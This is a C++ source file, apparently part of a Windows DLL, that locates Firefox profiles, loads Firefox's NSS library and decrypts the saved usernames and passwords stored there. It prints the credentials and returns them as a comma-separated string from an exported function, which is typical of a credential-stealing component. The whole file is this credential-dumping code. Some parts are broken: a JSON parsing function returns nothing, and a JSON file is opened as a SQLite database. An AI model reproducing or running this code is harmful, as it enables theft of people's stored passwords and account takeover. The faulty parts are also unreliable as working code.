// firefoxdecrypt.cpp : DLL アプリケーション用にエクスポートされる関数を定義します。
//

//http://www.rohitab.com/discuss/topic/40986-lets-decrypt-firefox-passwords/?p=10095780

//Win32APIを使用した時のコンパイルエラーの回避方法 http://tipstips.client.jp/ugopen/UfuncErrorW32.html
#include "stdafx.h"

#include <Shlwapi.h>
#include <Shlobj.h>
#include <string>
#include <cstdio>
#include <conio.h>
#include <vector>

#include <iostream>
#include <fstream>
#include <sstream>
#include "AuthData.h"
#include "picojson.h"

#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")


#define NOMINMAX
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0
#define SQLITE_OK 0
#define SQLITE_ROW 100
#define SQLITE_API


typedef enum SECItemType {
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID,
	siUnsignedInteger,
	siUTCTime,
	siGeneralizedTime
};

struct SECItem {
	SECItemType type;
	unsigned char *data;
	size_t len;
};

typedef enum SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
};


typedef struct PK11SlotInfoStr PK11SlotInfo;
typedef SECStatus(*NSS_Init) (const char *configdir);
typedef SECStatus(*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void(*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus(*PK11_CheckUserPassword) (PK11SlotInfo *slot, char *pw);
typedef SECStatus(*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus(*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int(SQLITE_API *fpSqliteOpen)(const char *, sqlite3 **);
typedef int(SQLITE_API *fpSqlitePrepare_v2)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
typedef int(SQLITE_API *fpSqliteStep)(sqlite3_stmt *);
typedef const unsigned char *(SQLITE_API *fpSqliteColumnText)(sqlite3_stmt*, int);
typedef unsigned long int CK_ULONG;
typedef CK_ULONG CK_MECHANISM_TYPE;
typedef struct PK11SymKeyStr PK11SymKey;


NSS_Init                NSSInit = NULL;
NSS_Shutdown            NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword  PK11CheckUserPassword = NULL;
PK11_FreeSlot           PK11FreeSlot = NULL;
PK11_Authenticate       PK11Authenticate = NULL;
PK11SDR_Decrypt         PK11SDRDecrypt = NULL;
NSS_Init				fpNSS_INIT = NULL;
NSS_Shutdown			fpNSS_Shutdown = NULL;

fpSqliteOpen isqlite3_open;
fpSqlitePrepare_v2 isqlite3_prepare_v2;
fpSqliteStep isqlite3_step;
fpSqliteColumnText isqlite3_column_text;


std::string getInstallPath(VOID) {
	LSTATUS lStatus;
	DWORD cbSize;
	char value[MAX_PATH];
	std::string path = "SOFTWARE\\Mozilla\\Mozilla Firefox";


	cbSize = MAX_PATH;
	if (!SHGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox ESR", "CurrentVersion", 0, value, &cbSize) ||
			!SHGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)) {
		path += "\\";
		path += value;
		path += "\\Main";
		cbSize = MAX_PATH;
		lStatus = SHGetValue(HKEY_LOCAL_MACHINE, path.c_str(), "Install Directory", 0, value, &cbSize);
	}
	return value;
}


BOOL LoadLib(std::string installPath) {
	// setup path
	char path[4096];
	DWORD dwError = GetEnvironmentVariable("PATH", path, 4096);
	std::string newPath = path;
	newPath += (";" + installPath);


	SetEnvironmentVariable("PATH", newPath.c_str());
	//[Win32] LoadLibrary のサーチパス http://blogs.wankuma.com/tocchann/archive/2008/03/14/127679.aspx
	//	HMODULE hNSS = LoadLibrary((installPath + "\\nss3.dll").c_str());
	HMODULE hNSS = LoadLibraryEx((installPath + "\\nss3.dll").c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);


	if (hNSS) {
		NSSInit = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
		NSSShutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
		PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
		PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
		PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
		PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
		PK11CheckUserPassword = (PK11_CheckUserPassword)GetProcAddress(hNSS, "PK11_CheckUserPassword");
		isqlite3_open = (fpSqliteOpen)GetProcAddress(hNSS, "sqlite3_open");
		isqlite3_prepare_v2 = (fpSqlitePrepare_v2)GetProcAddress(hNSS, "sqlite3_prepare_v2");
		isqlite3_step = (fpSqliteStep)GetProcAddress(hNSS, "sqlite3_step");
		isqlite3_column_text = (fpSqliteColumnText)GetProcAddress(hNSS, "sqlite3_column_text");
		fpNSS_INIT = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
		fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
	}

//	FreeLibrary(hNSS);
	return !(!NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword);
}

std::string DecryptString(std::string s) {
	BYTE byteData[8096];
	DWORD dwLength = 8096;
	PK11SlotInfo *slot = 0;
	SECStatus status;
	SECItem in, out;
	std::string result = "";


	ZeroMemory(byteData, sizeof(byteData));


	if (CryptStringToBinary(s.c_str(), s.length(), CRYPT_STRING_BASE64, byteData, &dwLength, 0, 0)) {
		slot = (*PK11GetInternalKeySlot) ();
		if (slot != NULL) {
			// see if we can authenticate
			status = PK11Authenticate(slot, PR_TRUE, NULL);
			if (status == SECSuccess) {
				in.data = byteData;
				in.len = dwLength;
				out.data = 0;
				out.len = 0;
				status = (*PK11SDRDecrypt) (&in, &out, NULL);
				if (status == SECSuccess) {
					memcpy(byteData, out.data, out.len);
					byteData[out.len] = 0;
					result = std::string((char*)byteData);
				}
				else {
					result = "Decryption failed";
				}
			}
			else {
				result = "Authentication failed";
			}
			(*PK11FreeSlot) (slot);
		}
		else {
			result = "Get Internal Slot failed";
		}
	}
	return result;
}

struct DATABASE_CREDENTIALS_ENTRIES {
	char *username;
	char *password;
	char *http;
	char *realm;
};

DATABASE_CREDENTIALS_ENTRIES * list_entriesjson(std::string login_json, int *n) {
	int entries = 0;
	int E = 1;
	*n = 0; //Just for ensurance :))
	DATABASE_CREDENTIALS_ENTRIES * ret = (DATABASE_CREDENTIALS_ENTRIES *)malloc(sizeof(DATABASE_CREDENTIALS_ENTRIES) * E);
	std::stringstream ss;
	std::ifstream f;
	f.open(login_json.c_str(), std::ios::binary);
	if (!f.is_open()) return NULL;
	ss << f.rdbuf();
	f.close();

	// Parse Json data
	picojson::value v;
	ss >> v;
	std::string err = picojson::get_last_error();
	if (!err.empty()) {
		std::cerr << err << std::endl;
		return NULL;
	}
	picojson::object& o = v.get<picojson::object>()["logins"].get<picojson::object>();
	o["encryptedUsername"].get<std::string>();
	o["encryptedPassword"].get<std::string>();
	o["hostname"].get<std::string>();
	o["httpRealm"].get<std::string>();


}
DATABASE_CREDENTIALS_ENTRIES *list_entries(std::string login_db, int *n) {
	int entries = 0;
	int E = 1;
	*n = 0; //Just for ensurance :))
	sqlite3 *db;
	std::string::size_type mx_realm, mx_name, mx_pw;
	mx_realm = mx_name = mx_pw = 15;
	//Lets make space for only one entry in case there are no entries
	DATABASE_CREDENTIALS_ENTRIES * ret = (DATABASE_CREDENTIALS_ENTRIES *)malloc(sizeof(DATABASE_CREDENTIALS_ENTRIES) * E);

	if (isqlite3_open(std::string(login_db.begin(), login_db.end()).c_str(), &db) == SQLITE_OK) {
		sqlite3_stmt *stmt;
		std::string query = "SELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins";
		if (isqlite3_prepare_v2(db, query.c_str(), -1, &stmt, 0) == SQLITE_OK) {
			while (isqlite3_step(stmt) == SQLITE_ROW) {
				if (E > 1) {
					//Lets expand the space for more data
					ret = (DATABASE_CREDENTIALS_ENTRIES *)realloc(ret, sizeof(DATABASE_CREDENTIALS_ENTRIES) * E);
				}
				std::string hostname,realm, name, passw;
				name = DecryptString((char*)isqlite3_column_text(stmt, 0));
				passw = DecryptString((char*)isqlite3_column_text(stmt, 1));
				//				realm = (char*)isqlite3_column_text(stmt, 2);//null error http://hpphone.blog104.fc2.com/blog-entry-1.html
				char *str = (char*)isqlite3_column_text(stmt, 2);
				hostname = str == NULL ? "" : str;
				char *str1 = (char*)isqlite3_column_text(stmt, 3);
				realm = str1 == NULL ? "" : str1;

				char *u = new char[strlen(name.c_str()) + 1];
				char *p = new char[strlen(passw.c_str()) + 1];
				char *h = new char[strlen(hostname.c_str()) + 1];
				char *r = new char[strlen(realm.c_str()) + 1];
				memcpy((void *)u, name.c_str(), strlen(name.c_str()) + 1);
				memcpy((void *)p, passw.c_str(), strlen(passw.c_str()) + 1);
				memcpy((void *)h, hostname.c_str(), strlen(hostname.c_str()) + 1);
				memcpy((void *)r, realm.c_str(), strlen(realm.c_str()) + 1);

				ret[entries].username = u;
				ret[entries].password = p;
				ret[entries].http = h;
				ret[entries].realm = r;
				entries++;
				E++;
			}
		}
		else {
			printf("\n  sqlite3_prepare_v2(\"%s\") : %s\n", "temp");
		}
	}
	else {
		printf("\n  sqlite3_open(\"%s\") : %s\n", "kik");
	}
	if (entries > 0) {
		//Lets capture those credentials
		*n = entries;
		return ret;
	}
	else {
		printf("\n  No entries found in \"%s\"", login_db.c_str());
	}
	return NULL;
	//free(ret);
}


int EnumProfiles(DATABASE_CREDENTIALS_ENTRIES **list) {
	char path[MAX_PATH];
	char appData[MAX_PATH], profile[MAX_PATH];
	char sections[4096];

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
	_snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\Mozilla\\Firefox\\profiles.ini", appData);
	GetPrivateProfileSectionNames(sections, 4096, path);
	char *p = sections;

	while (1) {
		if (_strnicmp(p, "Profile", 7) == 0) {
			GetPrivateProfileString(p, "Path", NULL, profile, MAX_PATH, path);
			_snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\Mozilla\\Firefox\\Profiles\\%s", appData, std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());


			if (!(*NSSInit) (path)) {
				//Search database for credentials
				printf("Profile PATH:%s\n", path);
				int n;
				
				if (PathFileExists((std::string(path)+std::string("\\logins.json")).c_str())) {
					*list = (list_entries(std::string(path) + "\\logins.json", &n));
				}else{
				*list = (list_entries(std::string(path) + "\\signons.sqlite", &n));
				}
				(*NSSShutdown) ();
				return n;
			}
			else {
				printf("\n  NSS_Init() failed");
			}
		}
		p += lstrlen(p) + 1;
		if (p[0] == 0) break;
	}
	return 0;
}


char* getAllAuthData() {
	std::vector<AuthData> rows;

	std::string installPath = getInstallPath();
	DATABASE_CREDENTIALS_ENTRIES *print = NULL;
	int n;

	if (!installPath.empty()) {
		if (LoadLib(installPath)) {
			n = EnumProfiles(&print);
			if (n > 0) {
				if (print != NULL) {
					for (int i = 0; i<n; i++) {
						AuthData row;
						printf("Entry: %d\n-----\n", i);
						printf("Username: %s\n", print[i].username);
						printf("Password: %s\n", print[i].password);
						printf("URL: %s\n", print[i].http);
						printf("Realm: %s\n", print[i].realm);
						printf("\n\n");
						row.Username(print[i].username);
						row.Password(print[i].password);
						row.Hostname(print[i].http);
						row.Realm(print[i].realm);
						rows.push_back(row);
					}
				}
				else {
					printf("There was an error in reading the credentials!\n");
				}
			}
		}
		else {
			printf("\n  Unable to initialize required libraries.");
		}
	}
	else {
		printf("\n  Firefox doesn't appear to be installed on this machine.");
	}
	free(print);

//	return "ww";
	std::string retval="";
	std::ostringstream oss;
	for (int j = 0; j < rows.size(); j++){
		AuthData last = rows.at(j);
//		retval += last.Username()  + last.Password() + last.Realm();
		oss << last.Username() << "," << last.Password() << "," << last.Hostname() << "," << last.Realm() << std::endl;

	}
	//	return retval.c_str();
	/*
	//http://iwaki2009.blogspot.jp/2012/08/stdstringchar.html
	std::string file = "c:\\hoge.jpg";
	int len = file.length();
	char* fname = new char[len + 1];
	memcpy(fname, file.c_str(), len + 1);
	*/
	retval = oss.str();
	char* retval_c = new char[retval.length() + 1];
	memcpy(retval_c, retval.c_str(), retval.length() + 1);
	return retval_c;

}
